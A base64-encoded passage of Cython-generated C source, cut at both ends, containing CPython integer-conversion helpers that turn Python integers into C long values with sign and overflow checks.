ZXMsIG9yZGVyX3N0ciB9OwogICAgICAgICAgICBpZiAoIWlzX3Vuc2lnbmVkKSB7CiAgICAgICAgICAgICAgICBrd2RzID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsKICAgICAgICAgICAgICAgIGlmICgha3dkcykgZ290byBsaW1pdGVkX2JhZDsKICAgICAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHIoInNpZ25lZCIsIF9fUHl4X05ld1JlZihQeV9UcnVlKSwga3dkcywgYXJncyszLCAwKSA8IDApIGdvdG8gbGltaXRlZF9iYWQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKGZyb21fYnl0ZXMsIGFyZ3MrMSwgMiB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwga3dkcyk7CiAgICAgICAgfQogICAgICAgIGxpbWl0ZWRfYmFkOgogICAgICAgIFB5X1hERUNSRUYoa3dkcyk7CiAgICAgICAgUHlfWERFQ1JFRihvcmRlcl9zdHIpOwogICAgICAgIFB5X1hERUNSRUYocHlfYnl0ZXMpOwogICAgICAgIFB5X1hERUNSRUYoZnJvbV9ieXRlcyk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKI2VuZGlmCiAgICB9Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBsb25nIF9fUHl4X1B5TG9uZ19Bc19sb25nKFB5T2JqZWN0ICp4KSB7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwdXNoCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIgojZW5kaWYKICAgIGNvbnN0IGxvbmcgbmVnX29uZSA9IChsb25nKSAtMSwgY29uc3RfemVybyA9IChsb25nKSAwOwojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wCiNlbmRpZgogICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87CiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHsKICAgICAgICBsb25nIHZhbDsKICAgICAgICBQeU9iamVjdCAqdG1wID0gX19QeXhfUHlOdW1iZXJfTG9uZyh4KTsKICAgICAgICBpZiAoIXRtcCkgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICB2YWwgPSBfX1B5eF9QeUxvbmdfQXNfbG9uZyh0bXApOwogICAgICAgIFB5X0RFQ1JFRih0bXApOwogICAgICAgIHJldHVybiB2YWw7CiAgICB9CiAgICBpZiAoaXNfdW5zaWduZWQpIHsKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNOZWcoeCkpKSB7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBfX1B5eF9jb21wYWN0X3VweWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTsKICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7CiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkpIHsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE3CiAgICAgICAgaWYgKHVubGlrZWx5KFB5X1NJWkUoeCkgPCAwKSkgewogICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9CiNlbHNlCiAgICAgICAgewogICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHgsIFB5X0ZhbHNlLCBQeV9MVCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSkKICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gMSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9CiNlbmRpZgogICAgICAgIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIHVuc2lnbmVkIGxvbmcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZyh4KSkKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgdW5zaWduZWQgUFlfTE9OR19MT05HLCBQeUxvbmdfQXNVbnNpZ25lZExvbmdMb25nKHgpKQojZW5kaWYKICAgICAgICB9CiAgICB9IGVsc2UgewojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAgICAgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgX19QeXhfY29tcGFjdF9weWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCkpCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7CiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpOwogICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KHgpKSB7CiAgICAgICAgICAgICAgICBjYXNlIC0yOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgbG9uZywgLShsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKChsb25nKS0xKSooKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNlbmRpZgogICAgICAgIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZihsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIGxvbmcsIFB5TG9uZ19Bc0xvbmcoeCkpCiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzTG9uZ0xvbmcoeCkpCiNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIHsKICAgICAgICBsb25nIHZhbDsKICAgICAgICBpbnQgcmV0ID0gLTE7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgUHlfc3NpemVfdCBieXRlc19jb3BpZWQgPSBQeUxvbmdfQXNOYXRpdmVCeXRlcygKICAgICAgICAgICAgeCwgJnZhbCwgc2l6ZW9mKHZhbCksIFB5X0FTTkFUSVZFQllURVNfTkFUSVZFX0VORElBTiB8IChpc191bnNpZ25lZCA/IFB5X0FTTkFUSVZFQllURVNfVU5TSUdORURfQlVGRkVSIHwgUHlfQVNOQVRJVkVCWVRFU19SRUpFQ1RfTkVHQVRJVkUgOiAwKSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHsKICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA+IChQeV9zc2l6ZV90KSBzaXplb2YodmFsKSkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXQgPSAwOwogICAgICAgIH0KI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSkKICAgICAgICBpbnQgb25lID0gMTsgaW50IGlzX2xpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbDsKICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcywgc2l6ZW9mKHZhbCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzX2xpdHRsZSwgIWlzX3Vuc2lnbmVkKTsKI2Vsc2UKICAgICAgICBQeU9iamVjdCAqdjsKICAgICAgICBQeU9iamVjdCAqc3RlcHZhbCA9IE5VTEwsICptYXNrID0gTlVMTCwgKnNoaWZ0ID0gTlVMTDsKICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25lZ2F0aXZlID0gMDsKICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IChzaXplb2YobG9uZykgPCA4KSA/IDMwIDogNjI7CiAgICAgICAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdCh4KSkpIHsKICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB2ID0gUHlOdW1iZXJfTG9uZyh4KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICAgICAgYXNzZXJ0KFB5TG9uZ19DaGVja0V4YWN0KHYpKTsKICAgICAgICB9CiAgICAgICAgewogICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHYsIFB5X0ZhbHNlLCBQeV9MVCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSkgewogICAgICAgICAgICAgICAgUHlfREVDUkVGKHYpOwogICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpc19uZWdhdGl2ZSA9IHJlc3VsdCA9PSAxOwogICAgICAgIH0KICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkoaXNfbmVnYXRpdmUpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfSBlbHNlIGlmIChpc19uZWdhdGl2ZSkgewogICAgICAgICAgICBzdGVwdmFsID0gUHlOdW1iZXJfSW52ZXJ0KHYpOwogICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghc3RlcHZhbCkpCiAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0ZXB2YWwgPSB2OwogICAgICAgIH0KICAgICAgICB2ID0gTlVMTDsKICAgICAgICB2YWwgPSAobG9uZykgMDsKICAgICAgICBtYXNrID0gUHlMb25nX0Zyb21Mb25nKCgxTCA8PCBjaHVua19zaXplKSAtIDEpOyBpZiAodW5saWtlbHkoIW1hc2spKSBnb3RvIGRvbmU7CiAgICAgICAgc2hpZnQgPSBQeUxvbmdfRnJvbUxvbmcoY2h1bmtfc2l6ZSk7IGlmICh1bmxpa2VseSghc2hpZnQpKSBnb3RvIGRvbmU7CiAgICAgICAgZm9yIChiaXRzID0gMDsgYml0cyA8IChpbnQpIHNpemVvZihsb25nKSAqIDggLSBjaHVua19zaXplOyBiaXRzICs9IGNodW5rX3NpemUpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnRtcCwgKmRpZ2l0OwogICAgICAgICAgICBsb25nIGlkaWdpdDsKICAgICAgICAgICAgZGlnaXQgPSBQeU51bWJlcl9BbmQoc3RlcHZhbCwgbWFzayk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGlnaXQpKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoZGlnaXQpOwogICAgICAgICAgICBQeV9ERUNSRUYoZGlnaXQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgdmFsIHw9ICgobG9uZykgaWRpZ2l0KSA8PCBiaXRzOwogICAgICAgICAgICB0bXAgPSBQeU51bWJlcl9Sc2hpZnQoc3RlcHZhbCwgc2hpZnQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgUHlfREVDUkVGKHN0ZXB2YWwpOyBzdGVwdmFsID0gdG1wOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7CiAgICAgICAgUHlfREVDUkVGKG1hc2spOyBtYXNrID0gTlVMTDsKICAgICAgICB7CiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIHJlbWFpbmluZ19iaXRzID0gKChpbnQpIHNpemVvZihsb25nKSAqIDgpIC0gYml0cyAtIChpc191bnNpZ25lZCA/IDAgOiAxKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA+PSAoMUwgPDwgcmVtYWluaW5nX2JpdHMpKSkKICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7CiAgICAgICAgICAgIHZhbCB8PSAoKGxvbmcpIGlkaWdpdCkgPDwgYml0czsKICAgICAgICB9CiAgICAgICAgaWYgKCFpc191bnNpZ25lZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkodmFsICYgKCgobG9uZykgMSkgPDwgKHNpemVvZihsb25nKSAqIDggLSAxKSkpKQogICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICAgICAgaWYgKGlzX25lZ2F0aXZlKQogICAgICAgICAgICAgICAgdmFsID0gfnZhbDsKICAgICAgICB9CiAgICAgICAgcmV0ID0gMDsKICAgIGRvbmU6CiAgICAgICAgUHlfWERFQ1JFRihzaGlmdCk7CiAgICAgICAgUHlfWERFQ1JFRihtYXNrKTsKICAgICAgICBQeV9YREVDUkVGKHN0ZXB2YWwpOwojZW5kaWYKICAgIC